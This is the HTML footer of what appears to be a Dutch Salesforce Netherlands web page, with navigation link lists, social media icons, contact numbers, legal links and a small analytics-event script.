                            <div class="social-media-links"><a href="http://www.facebook.com/salesforceNL" target="_blank" title="Facebook" data-tracking-type="social"><svg class="salesforce-social-icon icon-facebook" alt="Facebook"></svg></a><a href="http://twitter.com/salesforce_NL" target="_blank" title="Twitter" data-tracking-type="social"><svg class="salesforce-social-icon icon-twitter" alt="Twitter"></svg></a><a href="http://www.linkedin.com/company/salesforce" target="_blank" title="LinkedIn" data-tracking-type="social"><svg class="salesforce-social-icon icon-linkedin" alt="LinkedIn"></svg></a><a href="https://instagram.com/salesforce/" target="_blank" title="Instagram" data-tracking-type="social"><svg class="salesforce-social-icon icon-instagram" alt="Instagram"></svg></a><a href="https://www.youtube.com/user/SalesforceNederland" target="_blank" title="Youtube" data-tracking-type="social"><svg class="salesforce-social-icon icon-youtube" alt="Youtube"></svg></a></div>
                        </div>
                        <div class="footer-phone-number">
                            <div class="callus-link-text">
                                <p><span>Bel ons 0800 020 0555</span></p>
                            </div>
                        </div>
                    </div>
                    <div class="slds-col slds-large-size_3-of-12">
                        <div class="footer-heading">
                            <h3><span class="head-text">Nieuw met Salesforced?</span></h3>
                        </div>
                        <div>
                            <ul class="generic-links">
                                <li><span class="li-wrap"><a href="https://www.salesforce.com/nl/products/what-is-salesforce/" data-tracking-type="vertical_list">Wat is Salesforce?</a></span></li>
                                <li><span class="li-wrap"><a href="https://www.salesforce.com/nl/learning-centre/crm/what-is-crm/" data-tracking-type="vertical_list">Wat is CRM?</a></span></li>
                                <li><span class="li-wrap"><a href="https://www.salesforce.com/nl/learning-centre/tech/cloudcomputing/" data-tracking-type="vertical_list">Wat is Cloud Computing</a></span></li>
                                <li><span class="li-wrap"><a href="https://www.salesforce.com/nl/products/" data-tracking-type="vertical_list">CRM Oplossingen</a></span></li>
                                <li><span class="li-wrap"><a href="https://www.salesforce.com/nl/customer-success-stories/" data-tracking-type="vertical_list">Succesverhalen van onze Klanten</a></span></li>
                                <li><span class="li-wrap"><a href="https://www.salesforce.com/nl/editions-pricing/sales-cloud/" data-tracking-type="vertical_list">Prijzen en Edities</a></span></li>
                                <li><span class="li-wrap"><a href="https://www.salesforce.com/nl/form/contact/contactme/" data-tracking-type="vertical_list">Contact</a></span></li>
                            </ul>
                        </div>
                    </div>
                    <div class="slds-col slds-large-size_3-of-12">
                        <div class="footer-heading">
                            <h3><span class="head-text">Populaire links</span></h3>
                        </div>
                        <div>
                            <ul class="generic-links">
                                <li><span class="li-wrap"><a href="https://www.salesforce.com/nl/solutions/small-business-solutions/overview/" data-tracking-type="vertical_list">CRM voor het MKB</a></span></li>
                                <li><span class="li-wrap"><a href="https://www.salesforce.com/nl/products/sales-cloud/overview/" data-tracking-type="vertical_list">Verkoop Oplossingen</a></span></li>
                                <li><span class="li-wrap"><a href="https://www.salesforce.com/nl/products/service-cloud/overview/" data-tracking-type="vertical_list">Klantenservice Oplossingen</a></span></li>
                                <li><span class="li-wrap"><a href="https://www.salesforce.com/nl/products/marketing-cloud/overview/" data-tracking-type="vertical_list">Digital Marketing Oplossingen</a></span></li>
                                <li><span class="li-wrap"><a href="https://www.salesforce.com/nl/solutions/industries/" data-tracking-type="vertical_list">Industries</a></span></li>
                                <li><span class="li-wrap"><a href="https://www.salesforce.com/nl/resources/" data-tracking-type="vertical_list">Informatiecentrum</a></span></li>
                                <li><span class="li-wrap"><a href="https://www.salesforce.com/nl/events/" data-tracking-type="vertical_list">Salesforce Evenementen</a></span></li>
                            </ul>
                        </div>
                    </div>
                    <div class="slds-col slds-large-size_3-of-12">
                        <div class="footer-heading">
                            <h3><span class="head-text">Over Salesforce</span></h3>
                        </div>
                        <div>
                            <ul class="generic-links">
                                <li><span class="li-wrap"><a href="https://www.salesforce.com/nl/company/our-story/" data-tracking-type="vertical_list">Onze Cultuur</a></span></li>
                                <li><span class="li-wrap"><a href="https://careers.salesforce.com/en/our-locations/europe-middle-east-and-africa/netherlands/" data-tracking-type="vertical_list">Werken bij Salesforce</a></span></li>
                                <li><span class="li-wrap"><a href="https://www.salesforce.com/nl/company/news-press/press-releases/" data-tracking-type="vertical_list">Pers</a></span></li>
                                <li><span class="li-wrap"><a href="https://trust.salesforce.com/nl/" target="_blank" data-tracking-type="vertical_list"> Beveiliging<span role="img" class="salesforce-icon icon-sfdc-icon-offsite" aria-label="(opens in a new window)"></span></a></span></li>
                                <li><span class="li-wrap"><a href="https://www.salesforce.com/company/sustainability/" target="_blank" data-tracking-type="vertical_list"> Duurzaamheid<span role="img" class="salesforce-icon icon-sfdc-icon-offsite" aria-label="(opens in a new window)"></span></a></span></li>
                                <li><span class="li-wrap"><a href="https://www.salesforce.com/company/legal/" target="_blank" data-tracking-type="vertical_list"> Juridische informatie<span role="img" class="salesforce-icon icon-sfdc-icon-offsite" aria-label="(opens in a new window)"></span></a></span></li>
                                <li><span class="li-wrap"><a href="https://www.salesforce.com/nl/blog/" data-tracking-type="vertical_list">Salesforce Blog</a></span></li>
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
            <div class="page-footer bottomFooterNavigation">
                <div class="container"><hgf-regionselector></hgf-regionselector>
                    <div class="page-footer_content">
                        <div class="page-footer_legal">
                            <p>© Copyright 2023 Salesforce, Inc. <a href="/company/legal/intellectual/" adhocenable="false">Alle rechten voorbehouden</a>. De diverse handelsmerken zijn eigendom van de respectieve eigenaren. SFDC Netherlands BV, Gustav Mahlerlaan 2970, 1081 LA, Amsterdam, Nederland | Telefoon: 0800 020 0431</p>
                        </div>
                        <nav class="page-footer_links mobile-display">
                            <ul class="page-footer_links_list">
                                <li class="page-footer_links_item"><a class="page-footer_link" href="https://www.salesforce.com/company/legal/" data-tracking-type="ribbon">Juridische informatie</a></li>
                                <li class="page-footer_links_item"><a class="page-footer_link" href="https://www.salesforce.com/company/legal/sfdc-website-terms-of-service/" data-tracking-type="ribbon">Terms of Service</a></li>
                                <li class="page-footer_links_item"><a class="page-footer_link" href="https://www.salesforce.com/nl/company/privacy" data-tracking-type="ribbon">Privacyverklaring</a></li>
                                <li class="page-footer_links_item"><a class="page-footer_link" href="https://www.salesforce.com/nl/company/disclosure/" data-tracking-type="ribbon">Responsible Disclosure</a></li>
                                <li class="page-footer_links_item"><a class="page-footer_link" href="https://www.salesforce.com/nl/form/contact/contactme/" data-tracking-type="ribbon">Contact</a></li>
                                <li class="page-footer_links_item"><a class="page-footer_link" href="https://trust.salesforce.com/nl/" data-tracking-type="ribbon">Trust</a></li>
                                <li class="page-footer_links_item"><a class="page-footer_link optanon-toggle-display" href="#" data-ignore-geolocation="true" data-tracking-type="ribbon">Cookie-voorkeuren</a></li>
                                <li class="page-footer_links_item"><a class="page-footer_link" href="/form/other/privacy-request/?d=cta-footer-1" data-tracking-type="ribbon"><svg class="bottom-footer-icon icon-cpra" alt=""></svg>Uw privacybeslissingen</a></li>
                            </ul>
                        </nav>
                    </div>
                </div>
            </div>
        </footer>
    </hgf-footer>




    <div class="sf-call">
        <div class="call-btn-wrapper">









            <a class="btn" href="tel:0800 020 0431" aria-label="Contact, Telefoonnummer"></a>
        </div>
    </div>


    <script type="text/javascript">
        window.document.dispatchEvent(
            new CustomEvent('www_track', {
                detail: {
                    event: 'custEv_pageDataAvailable',
                    templateName: '',
                    templateId: '',
                    taxonomy: JSON.parse('{"pageTagsManual":[],"pageTagsAuto":[]}'),
                    experiment: {
                        'optimizelyExp': '',
                        'optimizelyVar': ''
                    }
                },
            })
        );
        //});
    </script>


    <script defer="" src="assets2/js/chat.js"></script>

    <script defer="" src="assets2/js/tableau-2.9.2.min.js"></script>



</body>

</html>